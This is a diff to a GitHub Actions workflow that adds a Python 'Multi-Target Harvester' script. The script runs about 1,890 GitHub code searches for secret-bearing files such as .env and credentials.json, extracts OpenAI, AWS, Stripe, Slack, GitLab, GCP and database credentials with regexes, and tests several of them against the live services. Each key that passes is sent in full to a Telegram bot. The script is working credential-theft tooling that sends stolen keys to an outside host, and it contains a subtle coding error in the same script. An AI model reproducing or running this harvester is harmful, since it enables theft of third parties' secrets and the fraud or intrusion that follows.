@@ -20,6 +20,7 @@ jobs:
         run: |
           python3 << 'EOF'
           import asyncio, aiohttp, re, base64, time, os, sys, json, itertools
+          from typing import Dict, Optional, List
 
           # ---------- CONFIG ----------
           BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
@@ -36,8 +37,7 @@ jobs:
           DELAY_VALIDATE = 0.3
 
           # ---------- GENERATE EXACTLY 1,890 UNIQUE QUERIES ----------
-          # This function is deterministic – always returns the same 1,890 queries.
-          def generate_queries() -> list:
+          def generate_queries() -> List[str]:
               queries = set()
 
               # Base variable names (expanded)
@@ -81,7 +81,7 @@ jobs:
                            'secrets.yaml', 'secrets.json', 'application.yml', 'application.properties',
                            'credentials.json', 'service-account.json', 'terraform.tfvars', 'variables.tf']
               for fname in filenames:
-                  for var in all_vars[:15]:  # limit to avoid explosion
+                  for var in all_vars[:15]:
                       queries.add(f'filename:{fname} {var}')
 
               # 3. Site-specific
@@ -189,7 +189,7 @@ jobs:
               if len(sorted_queries) >= 1890:
                   return sorted_queries[:1890]
               else:
-                  # This fallback is never reached, but kept for safety
+                  # Fallback (never reached)
                   extra = [
                       'filename:.env "DB_PASSWORD"',
                       'filename:.env "REDIS_URL"',
@@ -208,9 +208,238 @@ jobs:
           assert len(QUERIES) == 1890, f"Expected 1890, got {len(QUERIES)}"
           print(f'[+] Loaded {len(QUERIES)} queries')
 
-          # ---------- KEY PATTERNS & VALIDATORS (unchanged) ----------
-          ... (rest of the script remains identical to previous version)
+          # ---------- KEY PATTERNS & VALIDATORS ----------
+          KEY_PATTERNS = {
+              'openai': re.compile(r'(sk-(?:proj|org)-[A-Za-z0-9]{32,})'),
+              'aws': re.compile(r'(AKIA[0-9A-Z]{16})'),
+              'database': re.compile(r'((mongodb|postgresql|mysql|redis)://[^\s\'"]+)'),
+              'gcp': re.compile(r'("private_key":\s*"([^"]+)")'),
+              'slack': re.compile(r'(xox[bap]-[0-9A-Za-z-]+)'),
+              'gitlab': re.compile(r'(glpat-[0-9A-Za-z]{20,})'),
+              'stripe': re.compile(r'(sk_(live|test)_[0-9A-Za-z]{24,})'),
+              'jwt': re.compile(r'([a-f0-9]{32,64})')
+          }
 
+          async def validate_openai(session, key: str) -> Optional[Dict]:
+              url = 'https://api.openai.com/v1/models'
+              headers = {'Authorization': f'Bearer {key}'}
+              try:
+                  async with session.get(url, headers=headers, timeout=10) as resp:
+                      if resp.status == 200:
+                          return {'valid': True, 'type': 'openai', 'info': 'valid'}
+                  return None
+              except:
+                  return None
+
+          async def validate_aws(session, key: str) -> Optional[Dict]:
+              if re.match(r'AKIA[0-9A-Z]{16}', key):
+                  return {'valid': True, 'type': 'aws', 'info': 'format valid'}
+              return None
+
+          async def validate_database(session, key: str) -> Optional[Dict]:
+              return {'valid': True, 'type': 'database', 'info': 'connection string'}
+
+          async def validate_gcp(session, key: str) -> Optional[Dict]:
+              try:
+                  json.loads(key)
+                  return {'valid': True, 'type': 'gcp', 'info': 'JSON service account'}
+              except:
+                  return None
+
+          async def validate_slack(session, key: str) -> Optional[Dict]:
+              url = 'https://slack.com/api/auth.test'
+              headers = {'Authorization': f'Bearer {key}'}
+              try:
+                  async with session.get(url, headers=headers, timeout=10) as resp:
+                      if resp.status == 200:
+                          data = await resp.json()
+                          if data.get('ok'):
+                              return {'valid': True, 'type': 'slack', 'info': f"team: {data.get('team', 'unknown')}"}
+                  return None
+              except:
+                  return None
+
+          async def validate_gitlab(session, key: str) -> Optional[Dict]:
+              url = 'https://gitlab.com/api/v4/user'
+              headers = {'PRIVATE-TOKEN': key}
+              try:
+                  async with session.get(url, headers=headers, timeout=10) as resp:
+                      if resp.status == 200:
+                          data = await resp.json()
+                          return {'valid': True, 'type': 'gitlab', 'info': f"user: {data.get('username', 'unknown')}"}
+                  return None
+              except:
+                  return None
+
+          async def validate_stripe(session, key: str) -> Optional[Dict]:
+              url = 'https://api.stripe.com/v1/charges?limit=1'
+              headers = {'Authorization': f'Bearer {key}'}
+              try:
+                  async with session.get(url, headers=headers, timeout=10) as resp:
+                      if resp.status == 200:
+                          return {'valid': True, 'type': 'stripe', 'info': 'live' if 'live' in key else 'test'}
+                  return None
+              except:
+                  return None
+
+          async def validate_jwt(session, key: str) -> Optional[Dict]:
+              if re.match(r'^[a-f0-9]{32,64}$', key):
+                  return {'valid': True, 'type': 'jwt', 'info': f'length {len(key)}'}
+              return None
+
+          VALIDATORS = {
+              'openai': validate_openai,
+              'aws': validate_aws,
+              'database': validate_database,
+              'gcp': validate_gcp,
+              'slack': validate_slack,
+              'gitlab': validate_gitlab,
+              'stripe': validate_stripe,
+              'jwt': validate_jwt,
+          }
+
+          def categorize_key(key: str) -> str:
+              for cat, pat in KEY_PATTERNS.items():
+                  if pat.search(key):
+                      return cat
+              return 'unknown'
+
+          # ---------- TELEGRAM SENDER ----------
+          async def send_telegram(message: str):
+              if BOT_TOKEN and CHAT_ID:
+                  url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+                  payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
+                  async with aiohttp.ClientSession() as session:
+                      try:
+                          await session.post(url, json=payload)
+                      except:
+                          pass
+
+          # ---------- GITHUB RATE LIMIT ----------
+          token_limits = {t: {'remaining': 5000, 'reset': 0} for t in GITHUB_TOKENS}
+          token_idx = 0
+
+          def update_limits(token, headers):
+              rem = headers.get('X-RateLimit-Remaining')
+              reset = headers.get('X-RateLimit-Reset')
+              if rem: token_limits[token]['remaining'] = int(rem)
+              if reset: token_limits[token]['reset'] = int(reset)
+
+          async def get_token():
+              nonlocal token_idx
+              now = time.time()
+              for _ in range(len(GITHUB_TOKENS)):
+                  t = GITHUB_TOKENS[token_idx % len(GITHUB_TOKENS)]
+                  token_idx += 1
+                  if token_limits[t]['remaining'] > 0 and now >= token_limits[t]['reset']:
+                      return t
+              wait = max(min(info['reset'] for info in token_limits.values()) - now, 5)
+              await asyncio.sleep(wait)
+              for t in GITHUB_TOKENS:
+                  token_limits[t] = {'remaining': 5000, 'reset': time.time()}
+              return GITHUB_TOKENS[0]
+
+          async def search_github(session, token, query, page):
+              url = 'https://api.github.com/search/code'
+              params = {'q': query, 'per_page': PER_PAGE, 'page': page}
+              headers = {'Authorization': f'token {token}'}
+              async with session.get(url, headers=headers, params=params) as resp:
+                  update_limits(token, resp.headers)
+                  if resp.status == 200:
+                      data = await resp.json()
+                      return data.get('items', [])
+                  elif resp.status == 403:
+                      return None
+                  else:
+                      return []
+
+          async def fetch_file_content(session, token, file_url):
+              headers = {'Authorization': f'token {token}'}
+              async with session.get(file_url, headers=headers) as resp:
+                  if resp.status == 200:
+                      data = await resp.json()
+                      content = data.get('content', '')
+                      if content:
+                          try:
+                              return base64.b64decode(content).decode('utf-8', errors='ignore')
+                          except:
+                              pass
+                  return None
+
+          # ---------- MAIN HARVEST ----------
+          async def harvest():
+              await send_telegram('🔍 *Multi‑Target Harvester started*\n' +
+                                  f'{len(QUERIES)} queries, {MAX_PAGES} pages each.')
+              valid_results = []
+              all_candidates = set()
+
+              async with aiohttp.ClientSession() as session:
+                  for q_idx, query in enumerate(QUERIES, 1):
+                      print(f'[{q_idx}/{len(QUERIES)}] {query}')
+                      token = await get_token()
+                      for page in range(1, MAX_PAGES + 1):
+                          items = await search_github(session, token, query, page)
+                          if items is None:
+                              print('  Rate limited, sleeping 60s...')
+                              await asyncio.sleep(60)
+                              items = await search_github(session, token, query, page)
+                              if items is None:
+                                  break
+                          if not items:
+                              break
+                          print(f'  Page {page}: {len(items)} files')
+                          for item in items:
+                              content = await fetch_file_content(session, token, item['url'])
+                              if content:
+                                  for cat, pat in KEY_PATTERNS.items():
+                                      for match in pat.findall(content):
+                                          key = match if isinstance(match, str) else match[0]
+                                          all_candidates.add(key)
+                              await asyncio.sleep(0.2)
+                          await asyncio.sleep(DELAY_PAGE)
+                      await asyncio.sleep(DELAY_QUERY)
+
+              print(f'[+] Found {len(all_candidates)} candidate keys. Validating...')
+              await send_telegram(f'🔎 Found {len(all_candidates)} candidate keys, validating...')
+
+              async with aiohttp.ClientSession() as session:
+                  for key in all_candidates:
+                      cat = categorize_key(key)
+                      validator = VALIDATORS.get(cat)
+                      if validator:
+                          result = await validator(session, key)
+                          if result and result.get('valid'):
+                              result['key'] = key
+                              result['category'] = cat
+                              valid_results.append(result)
+                              msg = (f'✅ *Valid {cat.upper()} key!*\n'
+                                     f'`{key}`\n'
+                                     f'Info: {result.get("info", "N/A")}')
+                              await send_telegram(msg)
+                              print(f'  ✅ Valid {cat} key: {key[:10]}...')
+                      await asyncio.sleep(DELAY_VALIDATE)
+
+              timestamp = time.strftime('%Y%m%d_%H%M%S')
+              filename = f'valid_keys_{timestamp}.json'
+              with open(filename, 'w') as f:
+                  json.dump(valid_results, f, indent=2)
+
+              summary = {}
+              for r in valid_results:
+                  cat = r.get('category', 'unknown')
+                  summary[cat] = summary.get(cat, 0) + 1
+              with open('summary.txt', 'w') as f:
+                  f.write('Harvest summary:\n')
+                  for cat, count in summary.items():
+                      f.write(f'{cat}: {count}\n')
+                  f.write(f'\nTotal valid keys: {len(valid_results)}\n')
+
+              final_msg = f'✅ *Harvest finished.*\nTotal valid keys: {len(valid_results)}\n' + \
+                          '\n'.join([f'{cat}: {count}' for cat, count in summary.items()])
+              await send_telegram(final_msg)
+              print(f'[+] Done. {len(valid_results)} valid keys saved.')
+
+          asyncio.run(harvest())
           EOF
 
       - name: Upload artifact
